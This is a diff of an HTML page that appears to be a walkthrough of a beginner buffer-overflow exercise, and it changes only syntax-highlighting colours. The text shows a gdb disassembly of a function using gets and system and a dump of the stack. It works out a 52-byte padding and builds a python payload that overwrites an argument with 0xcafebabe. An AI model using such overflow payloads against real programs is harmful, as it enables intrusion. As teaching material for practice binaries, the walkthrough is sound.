-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>   <span style="color:#f99b15">0x5655562d</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">1</span><span style="color:#5bc4bf">&gt;</span>: mov    ebp,esp
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>   <span style="color:#f99b15">0x5655562f</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">3</span><span style="color:#5bc4bf">&gt;</span>: sub    esp,<span style="color:#f99b15">0x48</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span style="color:#5bc4bf">=&gt;</span> <span style="color:#f99b15">0x56555632</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">6</span><span style="color:#5bc4bf">&gt;</span>: mov    eax,gs:<span style="color:#f99b15">0x14</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>   <span style="color:#f99b15">0x56555638</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">12</span><span style="color:#5bc4bf">&gt;</span>:  mov    DWORD PTR [ebp<span style="color:#5bc4bf">-</span><span style="color:#f99b15">0xc</span>],eax
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>   <span style="color:#f99b15">0x5655563b</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">15</span><span style="color:#5bc4bf">&gt;</span>:  xor    eax,eax
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>   <span style="color:#f99b15">0x5655563d</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">17</span><span style="color:#5bc4bf">&gt;</span>:  mov    DWORD PTR [esp],<span style="color:#f99b15">0x5655578c</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>   <span style="color:#f99b15">0x56555644</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">24</span><span style="color:#5bc4bf">&gt;</span>:  call   <span style="color:#f99b15">0xf7e58890</span> <span style="color:#5bc4bf">&lt;</span>puts<span style="color:#5bc4bf">&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>   <span style="color:#f99b15">0x56555649</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">29</span><span style="color:#5bc4bf">&gt;</span>:  lea    eax,[ebp<span style="color:#5bc4bf">-</span><span style="color:#f99b15">0x2c</span>]
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>   <span style="color:#f99b15">0x5655564c</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">32</span><span style="color:#5bc4bf">&gt;</span>:  mov    DWORD PTR [esp],eax
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>   <span style="color:#f99b15">0x5655564f</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">35</span><span style="color:#5bc4bf">&gt;</span>:  call   <span style="color:#f99b15">0xf7e57fc0</span> <span style="color:#5bc4bf">&lt;</span>gets<span style="color:#5bc4bf">&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>   <span style="color:#f99b15">0x56555654</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">40</span><span style="color:#5bc4bf">&gt;</span>:  cmp    DWORD PTR [ebp<span style="color:#5bc4bf">+</span><span style="color:#f99b15">0x8</span>],<span style="color:#f99b15">0xcafebabe</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>   <span style="color:#f99b15">0x5655565b</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">47</span><span style="color:#5bc4bf">&gt;</span>:  jne    <span style="color:#f99b15">0x5655566b</span> <span style="color:#5bc4bf">&lt;</span>func<span style="color:#5bc4bf">+</span><span style="color:#f99b15">63</span><span style="color:#5bc4bf">&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>   <span style="color:#f99b15">0x5655565d</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">49</span><span style="color:#5bc4bf">&gt;</span>:  mov    DWORD PTR [esp],<span style="color:#f99b15">0x5655579b</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>   <span style="color:#f99b15">0x56555664</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">56</span><span style="color:#5bc4bf">&gt;</span>:  call   <span style="color:#f99b15">0xf7e33850</span> <span style="color:#5bc4bf">&lt;</span>system<span style="color:#5bc4bf">&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>   <span style="color:#f99b15">0x56555669</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">61</span><span style="color:#5bc4bf">&gt;</span>:  jmp    <span style="color:#f99b15">0x56555677</span> <span style="color:#5bc4bf">&lt;</span>func<span style="color:#5bc4bf">+</span><span style="color:#f99b15">75</span><span style="color:#5bc4bf">&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>   <span style="color:#f99b15">0x5655566b</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">63</span><span style="color:#5bc4bf">&gt;</span>:  mov    DWORD PTR [esp],<span style="color:#f99b15">0x565557a3</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span>   <span style="color:#f99b15">0x56555672</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">70</span><span style="color:#5bc4bf">&gt;</span>:  call   <span style="color:#f99b15">0xf7e58890</span> <span style="color:#5bc4bf">&lt;</span>puts<span style="color:#5bc4bf">&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span>   <span style="color:#f99b15">0x56555677</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">75</span><span style="color:#5bc4bf">&gt;</span>:  mov    eax,DWORD PTR [ebp<span style="color:#5bc4bf">-</span><span style="color:#f99b15">0xc</span>]
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span>   <span style="color:#f99b15">0x5655567a</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">78</span><span style="color:#5bc4bf">&gt;</span>:  xor    eax,DWORD PTR gs:<span style="color:#f99b15">0x14</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span>   <span style="color:#f99b15">0x56555681</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">85</span><span style="color:#5bc4bf">&gt;</span>:  je     <span style="color:#f99b15">0x56555688</span> <span style="color:#5bc4bf">&lt;</span>func<span style="color:#5bc4bf">+</span><span style="color:#f99b15">92</span><span style="color:#5bc4bf">&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span>   <span style="color:#f99b15">0x56555683</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">87</span><span style="color:#5bc4bf">&gt;</span>:  call   <span style="color:#f99b15">0xf7ef16c0</span> <span style="color:#5bc4bf">&lt;</span>__stack_chk_fail<span style="color:#5bc4bf">&gt;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span>   <span style="color:#f99b15">0x56555688</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">92</span><span style="color:#5bc4bf">&gt;</span>:  leave  
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span>   <span style="color:#f99b15">0x56555689</span> <span style="color:#5bc4bf">&lt;+</span><span style="color:#f99b15">93</span><span style="color:#5bc4bf">&gt;</span>:  ret    
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span>End of assembler dump<span style="color:#5bc4bf">.</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span>(gdb) b <span style="color:#5bc4bf">*</span><span style="color:#f99b15">0x56555654</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span>Breakpoint <span style="color:#f99b15">2</span> at <span style="color:#f99b15">0x56555654</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span>(gdb) c
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span>Continuing<span style="color:#5bc4bf">.</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span>overflow me : 
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span>Breakpoint <span style="color:#f99b15">2</span>, <span style="color:#f99b15">0x56555654</span> <span style="color:#5bc4bf">in</span> func ()
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span>(gdb) x<span style="color:#5bc4bf">/</span><span style="color:#f99b15">50</span>x <span style="color:#ef6155">$</span>esp
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span><span style="color:#f99b15">0xffffd0e0</span>: <span style="color:#f99b15">0xffffd0fc</span>  <span style="color:#f99b15">0xffffd184</span>  <span style="color:#f99b15">0xf7fad000</span>  <span style="color:#f99b15">0x0000000d</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span><span style="color:#f99b15">0xffffd0f0</span>: <span style="color:#f99b15">0xffffffff</span>  <span style="color:#f99b15">0xf7fad000</span>  <span style="color:#f99b15">0xf7e05e18</span>  <span style="color:#f99b15">0x41414141</span> <span style="color:#5bc4bf">&lt;==</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span><span style="color:#f99b15">0xffffd100</span>: <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39</span><span style="color:#f99b15">0xffffd110</span>: <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x14404000</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40</span><span style="color:#f99b15">0xffffd120</span>: <span style="color:#f99b15">0x00000001</span>  <span style="color:#f99b15">0xf7fad000</span>  <span style="color:#f99b15">0xffffd148</span>  <span style="color:#f99b15">0x5655569f</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41</span><span style="color:#f99b15">0xffffd130</span>: <span style="color:#f99b15">0xdeadbeef</span>  <span style="color:#f99b15">0x56555250</span>  <span style="color:#f99b15">0x565556b9</span>  <span style="color:#f99b15">0x00000000</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42</span><span style="color:#f99b15">0xffffd140</span>: <span style="color:#f99b15">0x00000001</span>  <span style="color:#f99b15">0xf7fad000</span>  <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0xf7e11286</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43</span><span style="color:#f99b15">0xffffd150</span>: <span style="color:#f99b15">0x00000001</span>  <span style="color:#f99b15">0xffffd1e4</span>  <span style="color:#f99b15">0xffffd1ec</span>  <span style="color:#f99b15">0x00000000</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44</span><span style="color:#f99b15">0xffffd160</span>: <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0xf7fad000</span>  <span style="color:#f99b15">0xf7ffdc0c</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45</span><span style="color:#f99b15">0xffffd170</span>: <span style="color:#f99b15">0xf7ffd000</span>  <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0x00000001</span>  <span style="color:#f99b15">0xf7fad000</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46</span><span style="color:#f99b15">0xffffd180</span>: <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0x0826aef6</span>  <span style="color:#f99b15">0x35a082e6</span>  <span style="color:#f99b15">0x00000000</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47</span><span style="color:#f99b15">0xffffd190</span>: <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0x00000001</span>  <span style="color:#f99b15">0x56555530</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48</span><span style="color:#f99b15">0xffffd1a0</span>: <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0xf7fee5f0</span>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span>(gdb) disas func
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span>Dump of assembler code <span style="color:#6ab825;font-weight:bold">for</span> function func:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span>   <span style="color:#3677a9">0x5655562c</span> &lt;+<span style="color:#3677a9">0</span>&gt;: push   ebp
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span>   <span style="color:#3677a9">0x5655562d</span> &lt;+<span style="color:#3677a9">1</span>&gt;: mov    ebp,esp
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span>   <span style="color:#3677a9">0x5655562f</span> &lt;+<span style="color:#3677a9">3</span>&gt;: sub    esp,<span style="color:#3677a9">0x48</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span>=&gt; <span style="color:#3677a9">0x56555632</span> &lt;+<span style="color:#3677a9">6</span>&gt;: mov    eax,gs:<span style="color:#3677a9">0x14</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span>   <span style="color:#3677a9">0x56555638</span> &lt;+<span style="color:#3677a9">12</span>&gt;:  mov    DWORD PTR [ebp-<span style="color:#3677a9">0xc</span>],eax
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span>   <span style="color:#3677a9">0x5655563b</span> &lt;+<span style="color:#3677a9">15</span>&gt;:  xor    eax,eax
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span>   <span style="color:#3677a9">0x5655563d</span> &lt;+<span style="color:#3677a9">17</span>&gt;:  mov    DWORD PTR [esp],<span style="color:#3677a9">0x5655578c</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span>   <span style="color:#3677a9">0x56555644</span> &lt;+<span style="color:#3677a9">24</span>&gt;:  call   <span style="color:#3677a9">0xf7e58890</span> &lt;puts&gt;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span>   <span style="color:#3677a9">0x56555649</span> &lt;+<span style="color:#3677a9">29</span>&gt;:  lea    eax,[ebp-<span style="color:#3677a9">0x2c</span>]
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span>   <span style="color:#3677a9">0x5655564c</span> &lt;+<span style="color:#3677a9">32</span>&gt;:  mov    DWORD PTR [esp],eax
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">13</span>   <span style="color:#3677a9">0x5655564f</span> &lt;+<span style="color:#3677a9">35</span>&gt;:  call   <span style="color:#3677a9">0xf7e57fc0</span> &lt;gets&gt;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">14</span>   <span style="color:#3677a9">0x56555654</span> &lt;+<span style="color:#3677a9">40</span>&gt;:  <span style="color:#24909d">cmp</span>    DWORD PTR [ebp+<span style="color:#3677a9">0x8</span>],<span style="color:#3677a9">0xcafebabe</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">15</span>   <span style="color:#3677a9">0x5655565b</span> &lt;+<span style="color:#3677a9">47</span>&gt;:  jne    <span style="color:#3677a9">0x5655566b</span> &lt;func+<span style="color:#3677a9">63</span>&gt;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">16</span>   <span style="color:#3677a9">0x5655565d</span> &lt;+<span style="color:#3677a9">49</span>&gt;:  mov    DWORD PTR [esp],<span style="color:#3677a9">0x5655579b</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">17</span>   <span style="color:#3677a9">0x56555664</span> &lt;+<span style="color:#3677a9">56</span>&gt;:  call   <span style="color:#3677a9">0xf7e33850</span> &lt;system&gt;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">18</span>   <span style="color:#3677a9">0x56555669</span> &lt;+<span style="color:#3677a9">61</span>&gt;:  jmp    <span style="color:#3677a9">0x56555677</span> &lt;func+<span style="color:#3677a9">75</span>&gt;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">19</span>   <span style="color:#3677a9">0x5655566b</span> &lt;+<span style="color:#3677a9">63</span>&gt;:  mov    DWORD PTR [esp],<span style="color:#3677a9">0x565557a3</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">20</span>   <span style="color:#3677a9">0x56555672</span> &lt;+<span style="color:#3677a9">70</span>&gt;:  call   <span style="color:#3677a9">0xf7e58890</span> &lt;puts&gt;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">21</span>   <span style="color:#3677a9">0x56555677</span> &lt;+<span style="color:#3677a9">75</span>&gt;:  mov    eax,DWORD PTR [ebp-<span style="color:#3677a9">0xc</span>]
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">22</span>   <span style="color:#3677a9">0x5655567a</span> &lt;+<span style="color:#3677a9">78</span>&gt;:  xor    eax,DWORD PTR gs:<span style="color:#3677a9">0x14</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">23</span>   <span style="color:#3677a9">0x56555681</span> &lt;+<span style="color:#3677a9">85</span>&gt;:  je     <span style="color:#3677a9">0x56555688</span> &lt;func+<span style="color:#3677a9">92</span>&gt;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">24</span>   <span style="color:#3677a9">0x56555683</span> &lt;+<span style="color:#3677a9">87</span>&gt;:  call   <span style="color:#3677a9">0xf7ef16c0</span> &lt;__stack_chk_fail&gt;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">25</span>   <span style="color:#3677a9">0x56555688</span> &lt;+<span style="color:#3677a9">92</span>&gt;:  leave  
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">26</span>   <span style="color:#3677a9">0x56555689</span> &lt;+<span style="color:#3677a9">93</span>&gt;:  ret    
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">27</span>End of assembler dump.
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">28</span>(gdb) b *<span style="color:#3677a9">0x56555654</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">29</span>Breakpoint <span style="color:#3677a9">2</span> at <span style="color:#3677a9">0x56555654</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">30</span>(gdb) c
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">31</span>Continuing.
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">32</span>overflow me : 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">33</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">34</span>Breakpoint <span style="color:#3677a9">2</span>, <span style="color:#3677a9">0x56555654</span> <span style="color:#6ab825;font-weight:bold">in</span> func ()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">35</span>(gdb) x/<span style="color:#3677a9">50</span>x <span style="color:#a61717;background-color:#e3d2d2">$</span>esp
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">36</span><span style="color:#3677a9">0xffffd0e0</span>: <span style="color:#3677a9">0xffffd0fc</span>  <span style="color:#3677a9">0xffffd184</span>  <span style="color:#3677a9">0xf7fad000</span>  <span style="color:#3677a9">0x0000000d</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">37</span><span style="color:#3677a9">0xffffd0f0</span>: <span style="color:#3677a9">0xffffffff</span>  <span style="color:#3677a9">0xf7fad000</span>  <span style="color:#3677a9">0xf7e05e18</span>  <span style="color:#3677a9">0x41414141</span> &lt;==
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">38</span><span style="color:#3677a9">0xffffd100</span>: <span style="color:#3677a9">0x41414141</span>  <span style="color:#3677a9">0x41414141</span>  <span style="color:#3677a9">0x41414141</span>  <span style="color:#3677a9">0x41414141</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">39</span><span style="color:#3677a9">0xffffd110</span>: <span style="color:#3677a9">0x41414141</span>  <span style="color:#3677a9">0x41414141</span>  <span style="color:#3677a9">0x41414141</span>  <span style="color:#3677a9">0x14404000</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">40</span><span style="color:#3677a9">0xffffd120</span>: <span style="color:#3677a9">0x00000001</span>  <span style="color:#3677a9">0xf7fad000</span>  <span style="color:#3677a9">0xffffd148</span>  <span style="color:#3677a9">0x5655569f</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">41</span><span style="color:#3677a9">0xffffd130</span>: <span style="color:#3677a9">0xdeadbeef</span>  <span style="color:#3677a9">0x56555250</span>  <span style="color:#3677a9">0x565556b9</span>  <span style="color:#3677a9">0x00000000</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">42</span><span style="color:#3677a9">0xffffd140</span>: <span style="color:#3677a9">0x00000001</span>  <span style="color:#3677a9">0xf7fad000</span>  <span style="color:#3677a9">0x00000000</span>  <span style="color:#3677a9">0xf7e11286</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">43</span><span style="color:#3677a9">0xffffd150</span>: <span style="color:#3677a9">0x00000001</span>  <span style="color:#3677a9">0xffffd1e4</span>  <span style="color:#3677a9">0xffffd1ec</span>  <span style="color:#3677a9">0x00000000</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">44</span><span style="color:#3677a9">0xffffd160</span>: <span style="color:#3677a9">0x00000000</span>  <span style="color:#3677a9">0x00000000</span>  <span style="color:#3677a9">0xf7fad000</span>  <span style="color:#3677a9">0xf7ffdc0c</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">45</span><span style="color:#3677a9">0xffffd170</span>: <span style="color:#3677a9">0xf7ffd000</span>  <span style="color:#3677a9">0x00000000</span>  <span style="color:#3677a9">0x00000001</span>  <span style="color:#3677a9">0xf7fad000</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">46</span><span style="color:#3677a9">0xffffd180</span>: <span style="color:#3677a9">0x00000000</span>  <span style="color:#3677a9">0x0826aef6</span>  <span style="color:#3677a9">0x35a082e6</span>  <span style="color:#3677a9">0x00000000</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">47</span><span style="color:#3677a9">0xffffd190</span>: <span style="color:#3677a9">0x00000000</span>  <span style="color:#3677a9">0x00000000</span>  <span style="color:#3677a9">0x00000001</span>  <span style="color:#3677a9">0x56555530</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">48</span><span style="color:#3677a9">0xffffd1a0</span>: <span style="color:#3677a9">0x00000000</span>  <span style="color:#3677a9">0xf7fee5f0</span>
 </code></pre></div><p>Examining the stack, we observe that our input is stored starting from the
 address <code>0xffffd0fc</code> and the function argument <code>0xdeadbeef</code> is stored at
 address <code>0xffffd130</code>, which we need to override with <code>0xcafebabe</code></p>
 <p>We need to figure out the length of our padding in order to overwrite the value
 at address <code>0xffffd130</code>. We can find this easily in python , subtractin the
 addresses</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span style="color:#5bc4bf">&gt;&gt;&gt;</span> <span style="color:#f99b15">0xffffd130</span><span style="color:#5bc4bf">-</span><span style="color:#f99b15">0xffffd0fc</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span style="color:#f99b15">52</span>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>&gt;&gt;&gt; <span style="color:#3677a9">0xffffd130</span>-<span style="color:#3677a9">0xffffd0fc</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">2</span><span style="color:#3677a9">52</span>
 </code></pre></div><p>So, we need a padding of size 52, and then we insert the required value in
 reverse order to overwrite the argument.</p>
 <p>Now, we create our new payload and run the program again</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span style="color:#ef6155">$python</span> -c <span style="color:#48b685">&#34;print(&#39;A&#39;*52 + &#39;\xbe\xba\xfe\xca&#39;)&#34;</span> &gt; payload
-</code></pre></div><div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>(gdb) x<span style="color:#5bc4bf">/</span><span style="color:#f99b15">50</span>x <span style="color:#ef6155">$</span>esp
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#f99b15">0xffffd0e0</span>: <span style="color:#f99b15">0xffffd0fc</span>  <span style="color:#f99b15">0xffffd184</span>  <span style="color:#f99b15">0xf7fad000</span>  <span style="color:#f99b15">0x0000000d</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#f99b15">0xffffd0f0</span>: <span style="color:#f99b15">0xffffffff</span>  <span style="color:#f99b15">0xf7fad000</span>  <span style="color:#f99b15">0xf7e05e18</span>  <span style="color:#f99b15">0x41414141</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span style="color:#f99b15">0xffffd100</span>: <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span style="color:#f99b15">0xffffd110</span>: <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span style="color:#f99b15">0xffffd120</span>: <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>  <span style="color:#f99b15">0x41414141</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span style="color:#f99b15">0xffffd130</span>: <span style="color:#f99b15">0xcafebabe</span>  <span style="color:#f99b15">0x56555200</span>  <span style="color:#f99b15">0x565556b9</span>  <span style="color:#f99b15">0x00000000</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span style="color:#f99b15">0xffffd140</span>: <span style="color:#f99b15">0x00000001</span>  <span style="color:#f99b15">0xf7fad000</span>  <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0xf7e11286</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span style="color:#f99b15">0xffffd150</span>: <span style="color:#f99b15">0x00000001</span>  <span style="color:#f99b15">0xffffd1e4</span>  <span style="color:#f99b15">0xffffd1ec</span>  <span style="color:#f99b15">0x00000000</span>
